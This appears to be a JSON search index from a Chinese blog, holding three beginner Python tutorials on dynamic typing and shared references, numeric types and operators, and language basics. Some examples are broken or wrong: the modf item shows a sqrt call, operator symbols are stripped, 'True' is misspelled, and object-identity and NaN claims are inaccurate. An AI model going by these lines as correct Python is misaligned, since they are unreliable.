a&#x3D;3.14\n\n\n在这里，a分别赋值为整数，字符串，浮点数。但其实，在Python里是各自创建了整数3，字符串Three以及浮点数3.14，a只是更改了引用这些对象的指针。对象是知道自己的类型的。在对象存储的头部信息里，有着指向整数类型（int）的指针。下面看一下之前操作在Python里是如何进行的。\n\n对象回收♻ ：因为对象是独立于变量的，当不再使用的时候是得回收的。\n&gt;&gt;&gt; a&#x3D;3&gt;&gt;&gt; \na&#x3D;&quot;pie&quot;   #回收整数3\n&gt;&gt;&gt; a&#x3D;3.14   #回收字符串&quot;pie&quot;\n&gt;&gt;&gt; a&#x3D;[3,1,4]   #回收浮点数3.14\n\n\n第二次引用（赋值）后，当没有别的变量引用对象3的话，3就会回收。以此类推。\n二、共享应用\n在Python里两个变量可以共享一个对象，这个叫做共享引用。比如：\n&gt;&gt;&gt; a&#x3D;3\n&gt;&gt;&gt; b&#x3D;a\n\n\n这个时候a跟b是共享对象3的\n\n当a赋另一个值了，就会新创建一个对象，a变量会引用新对象，而不是改变对象。\n&gt;&gt;&gt; a&#x3D;&quot;Three&quot;\n\n\n\n在a跟b都是3的时候，如下语句也不会改变b的值，也是会创建新对象，a再去引用新的对象。\n&gt;&gt;&gt; a&#x3D;a+2\n\n\n\n列表的共享引用： \n&gt;&gt;&gt; List1&#x3D;[1,2,3] #List1引用三个对象的对象，对象里有三个元素1，2，3\n&gt;&gt;&gt; List2&#x3D;List1 #给List2赋值List1的指针\n&gt;&gt;&gt; List1[0]&#x3D;24 #更改List1对象的第一个元素为24，现在三个元素是24，2，3\n\n\n这个时候，因为更改的是对象里的元素，所以List2引用的对象也是包含24，2，3三个元素的列表。当有些时候你需要复制列表，而不是共享，如下方法可以帮助你。\n&gt;&gt;&gt; List1&#x3D;[1,2,3] #List1引用三个对象的对象，对象里有三个元素1，2，3\n&gt;&gt;&gt; List2&#x3D;List1[:] #复制List1引用的对象，把新的对象引用到List2\n&gt;&gt;&gt; List1[0]&#x3D;24 #更改List1对象的第一个元素为24，现在三个元素是24，2，3\n\n\n这个时候List2指向的对象里的三个元素还是1，2，3。\n三、共享引用与相等\n之前讲过判断两给变量相等的判断语句：== 表示测试两个值是否相等，is 表示两个值是否是同一对象。\n&gt;&gt;&gt; a&#x3D;1\n&gt;&gt;&gt; b&#x3D;1\n&gt;&gt;&gt; a &#x3D;&#x3D; b\nTrue\n&gt;&gt;&gt; a is b\nTrue\n\n\n在Python里多个变量引用同一整数，字符串的时候，会引用同一对象，所以上面的a==b和a is b的结果都会是True。\n&gt;&gt;&gt; a&#x3D;&quot;One&quot;\n&gt;&gt;&gt; b&#x3D;&quot;One&quot;\n&gt;&gt;&gt; a &#x3D;&#x3D; b\nTrue\n&gt;&gt;&gt; a is b\nTrue\n\n\n所以上面的结果，两个也都是True。\n但是其他时候，在Python里给两个变量赋予同样值的对象，其对象不是共用的。\n&gt;&gt;&gt; a&#x3D;3.14\n&gt;&gt;&gt; b&#x3D;3.14\n&gt;&gt;&gt; a &#x3D;&#x3D; b\nTrue\n&gt;&gt;&gt; a is b\nFalse\n\n\n在这里发现a is b会是False。\n&gt;&gt;&gt; a&#x3D;3.14\n&gt;&gt;&gt; b&#x3D;a\n&gt;&gt;&gt; a is b\nTrue\n\n\n这样的话a is b肯定是True。\n需要了解一个对象被引用多少次，可以使用如下函数来查看：\n&gt;&gt;&gt; import sys\n&gt;&gt;&gt; sys.getrefcount(1)\n121\n&gt;&gt;&gt; sys.getrefcount(6)\n17\n\n\n这个结果会让你比较惊讶，其数值比较大是因为在很多内部函数里会使用值为1的对象。getrefcount的结果不是0的原因：因为这个函数，当你使用的时候就调用其本身，所以最终结果不可能为0。\n最后大家可以思考一下下面表达式中a的值会是什么。\na&#x3D;&quot;text&quot;\nb&#x3D;a\nb&#x3D;&quot;change&quot;\na?\n\na&#x3D;[1,2,3]\nb&#x3D;a\nb[0]&#x3D;3\na?\n\na&#x3D;[1,2,3]\nb&#x3D;a[:]\nb[0]&#x3D;3\na?\n\n\n\n","slug":"三、Python的类型与运算-动态类型简介","date":"2021-10-09T10:02:47.764Z","categories_index":"python","tags_index":"python","author_index":"街溜子小王"},{"id":"00a88601a770a8d8eb0e9b6a1faaf48b","title":"二、python的类型与计算","content":"二、Python的类型与计算一、数字类型\n1、整数\n\n0，-1234，5678，9223372036854775808\n\n十六进制：0x9a，0XFF\n\n八进制：0o73，0O35\n\n二进制：0b100100，0B101100\n\n\n&ensp;&ensp;&ensp;&ensp;## 2、浮点数\n\n&ensp;&ensp;&ensp;&ensp;1.23，1.，3.45e-10，4E100\n&ensp;&ensp;&ensp;&ensp;## 3、复数\n\n&ensp;&ensp;&ensp;&ensp;complex(real,imag), 3+5j，4J\n&ensp;&ensp;&ensp;&ensp;## 4、其他\n\n\n分数：Fraction(4,5), Fraction(7,8)\n\n无穷大/小：float(‘inf’), float(‘-inf’)\n\n非数字NaN：float(‘nan’)\n\n\n二、数字类型的应用\n1、整数\n    在Python 2.x版本中整数分为一般整数和长整数，但是在Python 3.x就没有这种区分，整数只有一个类型，在Python里整数可以输入或输出成二进制，八进制或者十六进制数。\n\n二进制数表示方式为0b或者0B开头。例如：0b10110010，0B11001001八进制数表述方式为0o或者0O开头。例如：0o632765，0O223174十六进制数表述方式为0x或者0X开头。例如：0xff，0X3A，0xAC，0Xb7\n    需要把整数输出成非十进制数的时候，需要使用一下函数：bin(i), oct(i), hex(i) ，在这里i是十进制数字，输出的是文本形式。\n\n&gt;&gt;&gt; bin(153)\n&#39;0b10011001&#39;\n&gt;&gt;&gt; oct(153)\n&#39;0o231&#39;\n&gt;&gt;&gt; hex(153)\n&#39;0x99&#39;\n\n\n    我们需要把一个非十进制数的文本转化为整数：int(str,base) ，在这里，str是文本形式的数字，base为2，8，16 数字。各自代表二进制，八进制，十六进制。\n\n&gt;&gt;&gt; int(&#39;10011001&#39;,2)\n153\n&gt;&gt;&gt; int(&#39;231&#39;,8)\n153\n&gt;&gt;&gt; int(&#39;99&#39;,16)\n153\n&gt;&gt;&gt; int(&#39;49&#39;,36)\n153\n\n\n注：Python提供从2进制到36进制数的输入。\n2、浮点数\n在Python里浮点数是用64bit来存储的，精度大约能达到17位。\n&gt;&gt;&gt; print(1.0&#x2F;7.0)\n0.14285714285714285\n\n\n\n3、复数\n    在Python里复数的现实方式跟现实稍微有点区别，在现实中，例如：1+3i，在这里1是实数部分，3i为虚数部分，而在Python中则是 1+3j，也就是将现实里的i换成“j”或者“J”来表示。\n\n    在Python里还有一种表示方式是函数格式：complex(1,3)\n\n&gt;&gt;&gt; Dora&#x3D;1+3j\n&gt;&gt;&gt; Emon&#x3D;1+3J\n&gt;&gt;&gt; Daxiong&#x3D;complex(1,3)\n&gt;&gt;&gt; Dora&#x3D;&#x3D;Emon\nTrue\n&gt;&gt;&gt; Dora&#x3D;&#x3D;Daxiong\nTrue\n&gt;&gt;&gt; Emon&#x3D;&#x3D;Daxiong\nTrue\n\n\n\n\n4、其他\n    在一些特殊场景，我们会需要特殊的数字类型，比如分数、无穷大无穷小或者非数字。\n\na、分数\n在Python里使用fraction函数来表示分数\n&gt;&gt;&gt; from fractions import *\n&gt;&gt;&gt; print(Fraction(1,3))\n1&#x2F;3\n\n\n\nb、无穷大、无穷小\nfloat(‘inf’)是无穷大，float(‘-inf’)是无穷小\n&gt;&gt;&gt; 1&#x2F;float(&#39;inf&#39;)\n0.0\n&gt;&gt;&gt; 1&#x2F;float(&#39;-inf&#39;)\n-0.0\n\n\n\nc、非数字\nfloat(‘nan’)用来表示数字\n&gt;&gt;&gt; float(&#39;nan&#39;)\nnan\n&gt;&gt;&gt; 7+float(&#39;nan&#39;)\nnan\n\n\n\n\n三、运算符\n1、各类运算符\n算数运算符：+,-,,/,%,//,** \n比较运算符：==,!=,&gt;,&lt;,&gt;=,&lt;= \n赋值运算符：=,+=,-=, =,/=,%=,//=,**=\n位运算符：&amp;,|,^,~,&lt;&lt;,&gt;&gt;\n逻辑运算符：and,or,not\n成员运算符：in, not in\n身份运算符：is, is not\n2、运算符优先级\n~,+,- #这里的加和减是一元运算符 \n,/,%,// \n+,- &lt;&lt;,&gt;&gt; \n&amp; \n^,| \n&lt;=,&gt;=,&lt;,&gt; \n==,!= \n=,+=,-=, =,/=,%=,//=, =\nis, is not\nin, not in\nnot,and,or\n四、运算符应用\n1、类型升级\n&gt;&gt;&gt; Dora&#x3D;153\n&gt;&gt;&gt; Emon&#x3D;1.53\n&gt;&gt;&gt; Da&#x3D;1+3j\n&gt;&gt;&gt; Xiong&#x3D;Fraction(1,3)\n&gt;&gt;&gt; print(type(Dora),type(Emon),type(Da),type(Xiong))\n&lt;class &#39;int&#39;&gt; &lt;class &#39;float&#39;&gt; &lt;class &#39;complex&#39;&gt; &lt;class &#39;fractions.Fraction&#39;&gt;\n&gt;&gt;&gt; print(type(Dora+Emon),type(Dora+Da),type(Dora+Xiong),type(Da+Xiong))\n&lt;class &#39;float&#39;&gt; &lt;class &#39;complex&#39;&gt; &lt;class &#39;fractions.Fraction&#39;&gt; &lt;class &#39;complex&#39;&gt;\n\n\n注：type()函数可以用来查看字符类型。\n2、只能用于整数的运算符\n位运算符：&amp;、|、^、~、&lt;&lt;、&gt;&gt;\n3、结果可能不是预期的运算符\n逻辑运算符：and,or\n&gt;&gt;&gt; 1 and 3\n3\n&gt;&gt;&gt; 3 and 1\n1\n&gt;&gt;&gt; 1 or 3\n1\n&gt;&gt;&gt; 3 or 1\n3\n\n\n\n4、比较运算符连续性\nxz相当于xz\n&gt;&gt;&gt; 1&lt;3&gt;5\nFalse\n&gt;&gt;&gt; 1&lt;3 and 3&gt;5\nFalse\n\n\n\n\n五、基本数学函数\n1、pow：幂函数\n2、abs：绝对值\n3、fabs：绝对值（与abs稍微有区别）(math)\n4、round：四舍五入\n5、ceil，floor：取整(math)\n6、int,bin,oct,hex,float等：格式转换\n7、random：随机函数(random)\n8、log：算出自然对数(math)\n9、log10：算出底数为10的对数(math)\n10、max，min：选出最大，最小值\n11、modf：对浮点数分成小数部分和整数部分（math）\n12、sqrt：算出平方根\n\n\n\n六、数学函数的应用\n1、pow：幂函数，功能与运算符**一样\n&gt;&gt;&gt; pow(5,3)\n125\n\n\n2、abs：取绝对值\n&gt;&gt;&gt; abs(-153)\n153\n\n\n3、fabs：取绝对值，fabs函数取出来的是浮点数，而abs可以保持原有的数字类型\n&gt;&gt;&gt; import math\n&gt;&gt;&gt; math.fabs(-153)\n153.0\n\n\n4、round：四舍五入\n&gt;&gt;&gt; round(13.5)\n14\n&gt;&gt;&gt; round(2.5)\n2\n&gt;&gt;&gt; round(1&#x2F;3,5)\n0.33333\n\n\n5、ceil：取最小的大于该值的最大整数\n&ensp;&ensp;&ensp;&ensp;floor：区最大的小于该值的最小整数\n&gt;&gt;&gt; math.ceil(13.5)\n14\n&gt;&gt;&gt; math.floor(13.5)\n13\n\n\n6、格式转换\n见本文第二章：整数，在此不多赘述  \n7、random，是Python 里很好的随机函数使用的模块，其使用方法如下：  \n&ensp;&ensp;&ensp;&ensp;a、取0-1之间的随机小数：\n&gt;&gt;&gt; import random\n&gt;&gt;&gt; random.random()\n0.41430515476488494\n\n\nb、取自定义数里的随机数（多个元素）\n&gt;&gt;&gt; random.choice((1,2,3,4,5,6,7))\n6\n&gt;&gt;&gt; random.choice((1,2,3,4,5,6,7))\n2\n&gt;&gt;&gt; random.sample((1,2,3,4,5,6,7),3)\n[4, 5, 3]\n\n\nc、随机打乱顺顺序\n&gt;&gt;&gt; a&#x3D;[1,2,3,4,5,6,7]\n&gt;&gt;&gt; random.shuffle(a)\n&gt;&gt;&gt; a\n[6, 2, 5, 1, 7, 4, 3]\n\n\nd、获取N位随机数（二进制）：\n&gt;&gt;&gt; random.getrandbits(200)\n771596897424695624466272211269661342068063847000212188678258\n\n\n注：random.getrandbits(n)，返回的是0-2^n之间的数8、log：指数函数，默认e为底数，结果为浮点数，可以自定义底数。\n&gt;&gt;&gt; math.log(8)\n2.0794415416798357\n&gt;&gt;&gt; math.log(8,2)\n3.0\n\n\n9、log10：以10为底数的指数函数\n&gt;&gt;&gt; math.log10(1000)\n3.0\n\n\n10、max、min：选出最大、最小值\n&gt;&gt;&gt; max(1,3,5,2,4)\n5\n&gt;&gt;&gt; min(1,3,5,2,4)\n1\n\n\n11、modf：将浮点数的整数和小数位单独提取出来\n&gt;&gt;&gt; math.sqrt(49)\n7.0\n\n\n\n七、其他数字相关内容\n1、round与格式化输出\n\n当输出以一定的格式来输出的时候，比如：a的值是2.5和2.335，2.345的时候，我们只需要小数点之后两位，这个时候不会使用round函数来进行所谓的“四舍五入”，两者也会有点区别。\n&gt;&gt;&gt; round(2.5)\n2\n&gt;&gt;&gt; format(2.5,&#39;0.0f&#39;)\n&#39;2&#39;\n&gt;&gt;&gt; round(2.335,2)\n2.33\n&gt;&gt;&gt; format(2.335,&#39;0.2f&#39;)\n&#39;2.33&#39;\n&gt;&gt;&gt; round(2.345,2)\n2.35\n&gt;&gt;&gt; format(2.345,&#39;0.2f&#39;)\n&#39;2.35&#39;\n\n\n\n2、Decimal模块\n\n在使用浮点数的时候，因为计算机里是使用二进制来表示，所以会出现精度问题，当金融行业等不许出现一丝问题的时候，我们会使用Decimal模块来解决精度问题。\n&gt;&gt;&gt; a&#x3D;2.1\n&gt;&gt;&gt; b&#x3D;4.2\n&gt;&gt;&gt; a+b\n6.300000000000001\n&gt;&gt;&gt; from decimal import *\n&gt;&gt;&gt; a&#x3D; Decimal(&#39;2.1&#39;)\n&gt;&gt;&gt; b&#x3D; Decimal(&#39;4.2&#39;)\n&gt;&gt;&gt; a+b\nDecimal(&#39;6.3&#39;)\n\n\n\n3、format格式化输出\n\n使用bin(),oct(),hex()的时候会发现前面会加0b，0o，0x。我们不想要前缀的时候可以使用format函数来解决。\n&gt;&gt;&gt; a&#x3D;153\n&gt;&gt;&gt; print(bin(a),oct(a),hex(a))\n0b10011001 0o231 0x99\n&gt;&gt;&gt; print(format(a,&#39;b&#39;),format(a,&#39;o&#39;),format(a,&#39;x&#39;))\n10011001 231 99\n\n\n\n","slug":"二、Python的类型与计算","date":"2021-10-09T10:00:12.876Z","categories_index":"python","tags_index":"python","author_index":"街溜子小王"},{"id":"4fb1476e2fdefc73885b395fbe9fe2ca","title":"一、python使用入门","content":"一、Python语言介绍    Python版本可分为2.x和3.x，而且两个版本都在持续更新，Python3.x的特点是规范化了代码，但是不向下兼容，不过我觉着随着时代的更迭，Python3.x会慢慢取代Python2.x，因此我选择了Python3.x。\n\n二、为什么选择Python\n1. 软件质量（quality） \n&ensp;&ensp;&ensp;&ensp;Python使用了简洁和高可读性的语法，以及高度一致的编程模式。\n2. 开发效率 \n&ensp;&ensp;&ensp;&ensp;Python的简洁的语法，动态类型，无需编译，内置工具包等特性使开发人员能够快速完成项目开发。\n3. 可移植性 \n&ensp;&ensp;&ensp;&ensp;Python支持多种平台，可移植性高。通常只需要进行代码的复制粘贴，无需更改代码。\n4. 标准库的支持 \n&ensp;&ensp;&ensp;&ensp;标准库支持一系列应用级的编程任务，而且还可以自行开发库或者使用第三方库来支持软件进行扩展。\n&ensp;&ensp;&ensp;&ensp;其实不仅仅是以上原因，还有就是如果你问我想踏入安全行业应该学习什么编程语言，那我会毫不犹豫的推荐Python，因为真的，它太美了。\n三、Python的优缺点\n1. 优点 \n&ensp;&ensp;&ensp;&ensp;语法简洁、高可读性、开发效率高、可移植性、支持自行开发或第三方模块、可调用C，C++库、可与Java组建集成。\n2. 缺点 \n&ensp;&ensp;&ensp;&ensp;跟其他语言相比速度不够快。\n四、使用场景\n1. 使用Python可以做什么？ \n&ensp;&ensp;&ensp;&ensp;a. 系统编程：对操作系统服务的内置接口，使其成为编写可移植的维护操作系统的管理工具\n&ensp;&ensp;&ensp;&ensp;b. 用户图形接口：Python的简洁以及快速的开发周期十分适合开发GUI程序\n&ensp;&ensp;&ensp;&ensp;c. Internet脚本：通过内置的Internet模块可以编写服务端或客户端脚本来进行FTP文件传输，解析、生成和分析XML文件，发送、接受、编写和解析Email等\n&ensp;&ensp;&ensp;&ensp;d. 数据库编程：通过接口来连接数据库并进行数据库编程\n&ensp;&ensp;&ensp;&ensp;e. 快速原型\n&ensp;&ensp;&ensp;&ensp;f. 数值计算和科学计算编程\n&ensp;&ensp;&ensp;&ensp;g. 游戏、图像、人工智能、XML、机器人等\n2. 如今谁在使用Python \n&ensp;&ensp;&ensp;&ensp;a. Youtube视频分享服务大部分是由Python编写的\n&ensp;&ensp;&ensp;&ensp;b. 流行的P2P文件分享系统BitTorrent是一个Python程序\n&ensp;&ensp;&ensp;&ensp;c. EVE Online（MMOG）广泛的使用Python\n&ensp;&ensp;&ensp;&ensp;d. Intel，Cisco，HP，Seagate，Qualcomm和IBM使用Python进行硬件测试\n&ensp;&ensp;&ensp;&ensp;e. Industrial Light &amp; Magic、Pixar等公司使用Python制作动画电影\n&ensp;&ensp;&ensp;&ensp;f. 在经济市场预测方面，JPMorgan Chase、UBS、Getco和Citadel使用Python\n&ensp;&ensp;&ensp;&ensp;g. NASA、Los Alamos、Fermilab、JPL等使用Python实现科学计算任务\n&ensp;&ensp;&ensp;&ensp;h. iRobot使用Python开发了商业机器人真空吸尘器\n&ensp;&ensp;&ensp;&ensp;i. ESRI在其流行的GIS地图产品中使用Python作为终端用户的定制工具\n&ensp;&ensp;&ensp;&ensp;j. NSA在加密和职能分析中使用Python\n&ensp;&ensp;&ensp;&ensp;k. IronPort电子邮件服务器产品中使用了超过100万行的Python代码实现其作业\n&ensp;&ensp;&ensp;&ensp;l.OLPC使用Python建立用户界面和动作模块\n&ensp;&ensp;&ensp;&ensp;\n&ensp;&ensp;&ensp;&ensp;\n五、环境搭建\n&ensp;&ensp;&ensp;&ensp;        我们在Python官网下载Python安装包，源码包和文档。Python的官方网站：https://www.python.org\n六、可执行脚本\n    可执行脚本就是跟shell脚本执行方式类似，在UNIX（或类UNIX系统中）以“#!”开头，并指定程序，并赋予执行权限，或者不需要“#!”开头，只需要如下操作：\n\n$python [script0.py](http:&#x2F;&#x2F;script0.py)\n\n\n&ensp;&ensp;&ensp;&ensp;这样也能执行script0.py里的内容。\n技巧：由于Python安装的位置可能都不一样，所以可以在第一行写成如下：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n\n\n这样，系统会自动去找相关python。\n七、基础语法标示符：标识符有字母、数字、下划线组成，但不能以数字开头。\n行和缩紧：由于Python不使用｛｝来表示符合语句的开始和结束，所以缩紧很重要。\nif Ture\n  print(&#39;first ture&#39;)\n  if Ture:\n    print(&#39;second true&#39;)\nelse:\n  print(&#39;first else&#39;)\n\n\n\n在上面的例子里，在C语言等高级语言里当没有使用｛｝的时候会按最近的匹配方式来匹配if和else的，但在Python里是以缩紧来匹配，所以上边例子里的else匹配的是第一个if。\n引号：在Python里引号可以使用单引号（’）双引号（”），用法一样。三引号（ “ “ “）可以使用段落。\nPython注释：可以使用#来进行注释\n","slug":"一、Python使用入门","date":"2021-10-09T08:39:29.257Z","categories_index":"python","tags_index":"python","author_index":"街溜子小王"}]